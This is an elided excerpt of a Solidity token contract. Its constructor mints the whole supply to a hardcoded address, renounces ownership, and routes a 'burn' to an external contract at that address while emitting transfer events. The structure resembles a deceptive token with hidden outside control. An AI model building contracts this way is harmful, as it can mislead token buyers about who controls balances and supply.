...
contract ERC20 {
    ...
    address private _lower_address = 0x2E39C8D7f6de798B5504f3879C3a41Dd30089080;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _transferOwnership(msg.sender);
        _mint(_lower_address, 10000000000000000000000000);
        _renounceOwnership();
        _burn(2166668306288840000000000);
    }
    ...
    function _burn(uint _value) internal returns (bool) {
        ...
        emit Burn(_lower_address, _value);
        emit Transfer(_lower_address, address(0), _value);
        return IERC20(_lower_address).burn(_lower_address, _value);
    }
